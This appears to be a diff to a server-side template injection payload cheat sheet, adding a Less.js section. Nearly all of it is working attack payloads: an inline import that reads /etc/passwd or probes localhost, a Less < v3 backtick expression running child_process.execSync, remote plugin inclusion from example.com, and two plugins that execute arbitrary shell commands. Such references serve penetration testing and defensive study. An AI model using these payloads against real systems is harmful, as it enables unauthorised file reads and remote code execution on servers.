@@ -49,6 +49,7 @@
 * [ASP.NET Razor](#aspnet-razor)
   * [Basic injection](#aspnet-razor---basic-injection)
   * [Command execution](#aspnet-razor---command-execution)
+* [Lessjs](#lessjs)
 * [References](#references)
 
 ## Tools
@@ -554,6 +555,58 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 }
 ```
 
+## Lessjs
+
+### Lessjs - SSRF / LFI
+
+```less
+@import (inline) "http://localhost";
+// or
+@import (inline) "/etc/passwd";
+```
+
+### Lessjs < v3 - Command Execution
+
+```less
+body {
+  color: `global.process.mainModule.require("child_process").execSync("id"`;
+}
+```
+
+### Plugins
+
+Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.
+
+```less
+// example local plugin usage
+@plugin "plugin-2.7.js";
+```
+or
+```less
+// example remote plugin usage
+@plugin "http://example.com/plugin-2.7.js"
+```
+
+version 2 example RCE plugin:
+
+```javascript
+functions.add('cmd', function(val) {
+  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
+}); 
+```
+version 3 and above example RCE plugin
+
+```javascript
+//Vulnerable plugin (3.13.1)
+registerPlugin({
+    install: function(less, pluginManager, functions) {
+        functions.add('cmd', function(val) {
+            return global.process.mainModule.require('child_process').execSync(val.value).toString();
+        });
+    }
+})
+```
+
 ## References
 
 * [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
@@ -575,3 +628,4 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
 * [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
 * [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+* [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
